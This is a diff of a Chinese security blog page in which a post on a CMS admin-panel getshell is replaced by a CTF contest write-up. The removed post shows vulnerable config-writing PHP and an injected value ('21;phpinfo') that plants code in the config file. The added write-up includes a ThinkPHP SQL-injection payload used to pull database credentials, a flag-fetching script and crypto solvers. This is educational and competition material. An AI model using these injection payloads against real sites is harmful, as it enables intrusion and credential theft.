@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>某CMS V5.7 SP2 后台Getshell · Fidcer&#39;Blog</title>
+    <title>豌豆杯入学ctf · Fidcer&#39;Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Fidcer&#39;Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">某CMS V5.7 SP2 后台Getshell</a>
+                <a href="#" class="post-name">豌豆杯入学ctf</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            某CMS V5.7 SP2 后台Getshell
+            豌豆杯入学ctf
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">464</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">810</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/02/21</span>
+                    <span class="post-intro-time">2019/10/16</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,32 +395,39 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <!--markdown-->dede/sys_info.php中
+        <!--markdown-->web题
+<hr>
+<p>1.题目:小可爱<br>第一步肯定是绕过本地回环地址<br><img src="http://118.126.66.150/52sec/10/4285938054.png" alt="CC25B038-F2D2-4F85-93F7-F51924B8DAB8.png"><br>一开始想到的是<code>x-forward-for</code>等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了<code>referer</code>成功绕过<br><img src="http://118.126.66.150/52sec/10/1177985903.png" alt="BC410D27-3BE1-40E5-ABF5-777F7144F502.png"><br><img src="http://118.126.66.150/52sec/10/366387116.png" alt="AEA1A04B-27BA-4393-953B-75D948C95027.png"><br>这里没啥思路只能爆破<br><img src="http://118.126.66.150/52sec/10/2499653827.png" alt="B9E617B3-EF26-477B-B78C-534C490FB3C4.png"><br>密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！<br><img src="http://118.126.66.150/52sec/10/1630037561.png" alt="122FC809-D249-4228-9EB5-1E7F101BB7C1.png"><br><img src="http://118.126.66.150/52sec/10/296032636.png" alt="ADBC80E5-9B6D-4483-B1D4-286FE4B9E3F2.png"><br>将图片下载下来，用<code>binwalk</code>查看下发现有压缩包!<code>foremost</code>下得到压缩包发现有密码<br><img src="http://118.126.66.150/52sec/10/2054271.png" alt="70BBCD6F-2D2E-4D93-8F11-80D576A5CB54.png"><br><img src="http://118.126.66.150/52sec/10/2411784842.png" alt="DABA844F-3716-4889-96CA-04A7E6137C96.png"><br>这个地方解了很久发现使用Dilraba的md5。。。。<br><img src="http://118.126.66.150/52sec/10/2601915022.png" alt="F0312D7E-FC35-4DE9-86AF-D5A0F5796C97.png"><br>得到一张图片再一次foremost得到一个压缩包成功拿到flag<br><img src="http://118.126.66.150/52sec/10/2175607698.png" alt="C065BA1C-B8B1-4157-9E8A-D6BD23ED6440.png"><br>2.题目:单身二十年<br><img src="http://118.126.66.150/52sec/10/1468141901.png" alt="EA018BA0-F2BB-4204-9784-8E3585F3511B.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">if($_COOKIE[&apos;token&apos;]==&apos;5D41402ABC4B2A76B9719D911017C592&apos;)&#123; </span><br><span class="line">    $file    =    &apos;dump/&apos;.md5(base64_encode(mt_rand(1,100))).&apos;.txt&apos;; </span><br><span class="line">    file_put_contents($file,file_get_contents(&apos;327A6C4304AD5938EAF0EFB6CC3E53DC.php&apos;)); </span><br><span class="line">    sleep(10); </span><br><span class="line">    unlink($file); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    header(&apos;Location: index.php&apos;); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">setcookie(&quot;token&quot;); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>//保存配置的改动</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if($dopost==&quot;save&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    if(!isset($token))&#123;</span><br><span class="line">        echo &apos;No token found!&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(strcasecmp($token, $_SESSION[&apos;token&apos;]) != 0)&#123;</span><br><span class="line">        echo &apos;Token mismatch!&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach($_POST as $k=&gt;$v)</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;#^edit___#&quot;, $k))</span><br><span class="line">        &#123;</span><br><span class="line">            $v = cn_substrR($&#123;$k&#125;, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $k = preg_replace(&quot;#^edit___#&quot;, &quot;&quot;, $k);</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__sysconfig` SET `value`=&apos;$v&apos; WHERE varname=&apos;$k&apos; &quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    ReWriteConfig();</span><br><span class="line">    ShowMsg(&quot;成功更改站点配置！&quot;, &quot;sys_info.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。<br>一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。<br><img src="http://118.126.66.150/52sec/10/3316060136.png" alt="9BB9177B-2227-4784-A0BB-B029ED948AF3.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">for i in range(1,101):</span><br><span class="line">	headers = &#123;&apos;Content-type&apos;:&apos;text/html;charset=utf-8&apos;&#125;</span><br><span class="line">	encodestr = base64.b64encode(str(i).encode(&apos;utf-8&apos;))</span><br><span class="line">	cookies = &#123;&apos;token&apos;:&apos;5D41402ABC4B2A76B9719D911017C592&apos;&#125;</span><br><span class="line">	#print(encodestr)</span><br><span class="line">	m = hashlib.md5()</span><br><span class="line">	m.update(encodestr)</span><br><span class="line">	#print(m.hexdigest())</span><br><span class="line">	a = m.hexdigest()</span><br><span class="line">	url = &apos;http://106.14.145.133:8081/web10/dump/&apos;+a+&apos;.txt&apos;</span><br><span class="line">	#print(url)</span><br><span class="line">	url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2)</span><br><span class="line">	#print(url_get.headers)</span><br><span class="line">	#print(url_get.cookies)</span><br><span class="line">	if url_get.status_code == 200:</span><br><span class="line">		print(url_get.text)</span><br></pre></td></tr></table></figure>
 
-<p>在选择更改配置后，通过<strong>foreach($_POST as $k=&gt;$v)</strong>接受参数，并且将参数内容写入了数据库，之后进入ReWriteConfig();。</p>
-<p>//更新配置函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function ReWriteConfig()</span><br><span class="line">&#123;</span><br><span class="line">    global $dsql,$configfile;</span><br><span class="line">    if(!is_writeable($configfile))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;配置文件&apos;&#123;$configfile&#125;&apos;不支持写入，无法修改系统配置参数！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $fp = fopen($configfile,&apos;w&apos;);</span><br><span class="line">    flock($fp,3);</span><br><span class="line">    fwrite($fp,&quot;&lt;&quot;.&quot;?php\r\n&quot;);</span><br><span class="line">    $dsql-&gt;SetQuery(&quot;SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC &quot;);</span><br><span class="line">    $dsql-&gt;Execute();</span><br><span class="line">    while($row = $dsql-&gt;GetArray())</span><br><span class="line">    &#123;</span><br><span class="line">        if($row[&apos;type&apos;]==&apos;number&apos;)</span><br><span class="line">        &#123;</span><br><span class="line">            if($row[&apos;value&apos;]==&apos;&apos;) $row[&apos;value&apos;] = 0;</span><br><span class="line">            fwrite($fp,&quot;\$&#123;$row[&apos;varname&apos;]&#125; = &quot;.$row[&apos;value&apos;].&quot;;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            fwrite($fp,&quot;\$&#123;$row[&apos;varname&apos;]&#125; = &apos;&quot;.str_replace(&quot;&apos;&quot;,&apos;&apos;,$row[&apos;value&apos;]).&quot;&apos;;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite($fp,&quot;?&quot;.&quot;&gt;&quot;);</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>3.题目:初心不改<br><img src="http://118.126.66.150/52sec/10/2370270929.png" alt="1975DE5B-D07B-4569-B8D0-E7171F2A034C.png"><br>访问页面发现是一个thinkphp5.0 一猜就是sql注入<br>一开始以为是构造一个注入然后load_file到flag后来发现想多了，直接通过payload拿到mysql账号密码<br><code>/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><img src="http://118.126.66.150/52sec/10/2511860583.png" alt="BA7D4195-9527-4B06-A1D8-28ABF453FE46.png"><br>主页查看源码发现有一个phpmyadmin，登陆后成功拿到flag<br><img src="http://118.126.66.150/52sec/10/3803853201.png" alt="73F165EC-C956-40AD-9106-ADE323691340.png"></p>
+<p>web题我是全部AK掉了有些题目是通过exp直接拿到flag太简单了就不讲了。<br><img src="http://118.126.66.150/52sec/10/3180203719.png" alt="ADE2EF99-DEF7-46F4-AA7D-066EC4402E12.png"><br>Crypto题</p>
+<hr>
+<p>1.题目:震惊，凯撒竟被4人关在一密室</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">凯撒被4个人关在一个密室里！</span><br><span class="line">aCU3QjkxMjkxMTA3bjVnMTZoNjNjJTdEY2cwNDBoM2g4aTRlMDc3ZmYz</span><br></pre></td></tr></table></figure>
 
-<p>这里的代码将前面插入数据库的数据直接取出，没有再做验证。在while($row = $dsql-&gt;GetArray())，有两个分支，当$row[‘type’]==’number’时，会往文件中直接写入，其他情况下会进行一次str_replace(“‘“,’’,$row[‘value’])将单引号替换掉。所以我们考虑使用第一个分支，选择一个默认为数字的参数。</p>
-<p>比如使用参数cfg_ftp_port，它表示采用的ftp端口，<br><img src="http://118.126.66.150/52sec/02/2471402698.png" alt="20180227093936-11cc4aa0-1b5f-1.png"></p>
-<p>我们填入值为21;phpinfo</p>
-<p><img src="http://118.126.66.150/52sec/02/70036466.png" alt="20180227094004-2261ebcc-1b5f-1.png"></p>
-<p>Getshell:</p>
-<p><img src="http://118.126.66.150/52sec/02/1045518397.png" alt="20180227094055-409c9c22-1b5f-1.png"></p>
-<p>查看配置文件 data/config.cache.inc.php<br><img src="http://118.126.66.150/52sec/02/816598179.png" alt="20180227094102-44b191dc-1b5f-1.png"></p>
-<p>原文地址:<a href="https://xianzhi.aliyun.com/forum/topic/2071" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/2071</a></p>
+<p>先是base64<br><img src="http://118.126.66.150/52sec/10/4195125983.png" alt="9B275494-53D5-4527-8A72-F5844E6A5CD8.png"><br>然后url编码<br><img src="http://118.126.66.150/52sec/10/1834402293.png" alt="647F179F-6624-426A-924B-3538D10E806A.png"><br>栅栏编码四组<br><img src="http://118.126.66.150/52sec/10/3756062370.png" alt="9D959343-EA85-4A6D-85A4-7D017E27DDE7.png"><br>凯撒拿到flag<br><img src="http://118.126.66.150/52sec/10/2613812638.png" alt="9192AE6D-3539-4AC4-83FD-97E3D50A533A.png"></p>
+<p>2.题目:粗心大意的主管<br>已知密文为:925♥♥♥A2D74♥♥DDE4♥EBC0♥♥♥1D0E♥♥7<br>原文为:8E5♥♥C14DCD♥CDE8♥♥55F3738♥11DE7A。<br>写个python就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import string</span><br><span class="line">import hashlib</span><br><span class="line">payloads = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">for a in payloads:</span><br><span class="line">    for b in payloads:</span><br><span class="line">        for c in payloads:</span><br><span class="line">        	for d in payloads:</span><br><span class="line">        		for e in payloads:</span><br><span class="line">        			for f in payloads:</span><br><span class="line">			            s = &quot;8E5&quot;+a+d+&quot;C14DCD&quot;+b+&quot;CDE8&quot;+e+c+&quot;55F3738&quot;+f+&quot;11DE7A&quot;</span><br><span class="line">			            tmp = hashlib.md5(s).hexdigest().upper()</span><br><span class="line">			            if &apos;925&apos; in tmp and &apos;A2D74&apos; in tmp and &apos;DDE4&apos; in tmp and &apos;EBC0&apos; in tmp:</span><br><span class="line">			                print(s)</span><br><span class="line">		               		print(tmp)</span><br></pre></td></tr></table></figure>
+
+<p>3.题目:畸形的凯撒<br>密文：afZ_rCI[kA55#;ASc9*%$c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char=&quot;afZ_rCI[kA55#;ASc9*%$c&quot;</span><br><span class="line">i = 0</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">while i &lt; len(char):</span><br><span class="line">	num = ord(char[i])+(i+5)</span><br><span class="line">	flag+=chr(num)</span><br><span class="line">	i+=1</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><p>1.题目:机密文件<br>用NET.Reflector Pro工具打开文件<br><img src="http://118.126.66.150/52sec/10/2721756916.png" alt="6B517F8B-57C6-43CC-AD32-AF739244D967.png"><br>看到源代码<br>发现是aes加密使用openssl解密或者用c#再写一个解密的<br>password也在里面<br><img src="http://118.126.66.150/52sec/10/3386985755.png" alt="27E2F10D-6444-4F29-A275-9BBA743B8386.png"><br><img src="http://118.126.66.150/52sec/10/618023056.png" alt="593D7C75-0E7F-4421-A4C7-A572F8ED6572.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-128-cbc -nosalt -d -in secret.636748579460890458.bin -iv 6b6a704853325367344c716637754e65 -K 6b6a704853325367344c716637754e65 -p</span><br></pre></td></tr></table></figure>
+
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://vuln.top">Fidcer</a>
-            <p>原文链接：<a href="https://vuln.top/2019/02/21/21/">https://vuln.top/2019/02/21/21/</a>
-            <p>发表日期：<a href="https://vuln.top/2019/02/21/21/">February 21st 2019, 11:45:05 am</a>
-            <p>更新日期：<a href="https://vuln.top/2019/02/21/21/">February 23rd 2019, 11:24:49 pm</a>
+            <p>原文链接：<a href="https://vuln.top/2019/10/16/137/">https://vuln.top/2019/10/16/137/</a>
+            <p>发表日期：<a href="https://vuln.top/2019/10/16/137/">October 16th 2019, 8:19:46 pm</a>
+            <p>更新日期：<a href="https://vuln.top/2019/10/16/137/">October 16th 2019, 8:19:46 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -428,17 +435,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/02/21/27/" title= "centos6.5 搭建pxe 服务器">
-                    <div class="nextTitle">centos6.5 搭建pxe 服务器</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/02/21/让终端走代理的方法/" title= "让终端走代理的方法">
-                    <div class="prevTitle">让终端走代理的方法</div>
+                <a href= "/2019/10/15/内网渗透/" title= "CTF内网渗透题">
+                    <div class="prevTitle">CTF内网渗透题</div>
                 </a>
             
         </li>
@@ -570,7 +572,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">1.</span> <span class="toc-text">REVERSE</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
